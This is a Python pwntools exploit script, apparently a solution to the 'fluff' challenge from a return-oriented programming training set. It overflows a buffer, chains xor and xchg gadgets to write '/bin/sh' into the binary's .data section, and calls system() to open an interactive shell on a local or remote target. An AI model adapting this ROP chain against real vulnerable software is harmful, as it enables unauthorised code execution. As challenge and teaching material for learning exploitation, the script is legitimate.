#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./fluff')
# context.terminal = ['tmux', 'splitw', '-h']
context.terminal = ['tmux', 'new-window']

host = args.HOST or ''
port = int(args.PORT or 8080)

def local(argv=[], *a, **kw):
    return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(argv, *a, **kw)
    else:
        return local(argv, *a, **kw)


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

if args.GEF:
    gdb.attach(io, gdb_args=['-q', '-ex', 'init-gef'], gdbscript='''
    ''')
    # pie breakpoint function+118

if args.PWNDBG:
    gdb.attach(io, gdb_args=['-q', '-ex', 'init-pwndbg'], gdbscript='''
    ''')
    # piebase 0x7f0

rop = ROP(exe)
GADGET1 = 0x0000000000400822 # xor r11,r11; pop r14; mov edi,0x601050; ret
GADGET2 = 0x000000000040082f # xor r11,r12; pop r12; mov r13d,0x604060; ret
GADGET3 = 0x0000000000400840 # xchg r11,r10; pop r15; mov r11d,0x602050; ret
GADGET4 = 0x000000000040084e # mov QWORD PTR [r10],r11; pop r13; pop r12; xor BYTE PTR [r10],r12b; ret
POP_R12 = 0x0000000000400832
POP_RDI = rop.find_gadget(["pop rdi", "ret"]).address
WRITE_ADDR = 0x0000000000601050 # .data section
SYSTEM_ADDR = exe.sym.system

# io.sendline(cyclic(1024))
OFFSET = cyclic_find(0x6161616b)
payload = "A" * OFFSET

# Put address we want to write at in r12
payload += p64(POP_R12)
payload += p64(WRITE_ADDR)

# Zero out r11
payload += p64(GADGET1)
payload += "junkjunk" # r14

# Xor r11 with r12 
payload += p64(GADGET2)
payload += "junkjunk" # r12

# Exchange r11 with r10 to setup r10
payload += p64(GADGET3)
payload += "junkjunk" # r15

# Put string at in r12
payload += p64(POP_R12)
payload += "/bin/sh\x00"

# Zero out r11
payload += p64(GADGET1)
payload += "junkjunk" # r14

# Xor r11 with r12 
payload += p64(GADGET2)
payload += "junkjunk" # r12

# Write string in r11 into address pointed to by r10, r12 needs to be 0 so it doesn't change the string
payload += p64(GADGET4)
payload += "junkjunk" # r13
payload += p64(0x0000000000000000) # r12

# Fill rdi with the address of the string (so that system will take it as an argument) 
payload += p64(POP_RDI)
payload += p64(WRITE_ADDR)

# Call system (stack is aligned)
payload += p64(SYSTEM_ADDR)
io.sendline(payload)

io.interactive()

